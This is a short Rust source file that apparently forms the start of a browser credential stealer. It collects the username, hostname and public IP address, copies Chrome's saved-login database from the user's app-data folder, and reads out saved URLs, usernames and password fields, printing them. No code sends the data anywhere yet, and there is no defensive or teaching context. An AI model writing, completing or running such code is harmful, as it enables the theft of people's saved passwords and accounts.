use whoami;
use serde::Deserialize;
use serde_json::Value;
use platform_dirs::AppDirs;
use std::{path::PathBuf, fs};
use rusqlite::{Connection, Result};

struct User {
    ip: String,
    username: String,
    hostname: String,
}
#[derive(Deserialize)]
struct Ip {
    origin: String,
}

#[derive(Debug)]
struct Chrome {
    url: String,
    login: String,
    password: String,
}

impl User {
    fn ip() -> Result<String, ureq::Error> {
        let body: String = ureq::get("http://httpbin.org/ip")
        .call()?
        .into_string()?;
        let ip: Ip = serde_json::from_str(body.as_str()).unwrap();
        Ok(ip.origin)
    }
}

impl Chrome {
    fn local_app_data_folder(open: &str) -> PathBuf {
        AppDirs::new(Some(open), false).unwrap().data_dir
    }

    fn find_db() -> std::io::Result<PathBuf> {
        let local_sqlite_path = Chrome::local_app_data_folder("Google\\Chrome\\USer Data\\Default\\Login Data");
        let moved_to = Chrome::local_app_data_folder("sqlite_file");
        let db_file = moved_to.clone();
        fs::copy(local_sqlite_path, moved_to)?;

        Ok(db_file)
    }

    fn obtain_data_from_db() -> Result<Vec<Chrome>> {
        let conn = Connection::open(Chrome::find_db().unwrap())?;
        
        let mut stmt = conn.prepare("SELECT action_url, username_value, password_value from logins")?;
        let chrome_data = stmt.query_map([], |row| {
        Ok(Chrome {
        url: row.get(0)?,
        login: row.get(1)?,
        password: row.get(2)?,
        })
        })?;
        
        let mut result = vec![];
        
        for data in chrome_data {
        result.push(data.unwrap());
        }
        
        Ok(result)
        }
}

fn main() {
    /*
    println!("{} {} {}", whoami::username(), whoami::hostname(), User::ip().unwrap());
    Chrome::find_db();
     */
    let res = Chrome::obtain_data_from_db();

println!("{:?}", res.unwrap());
}
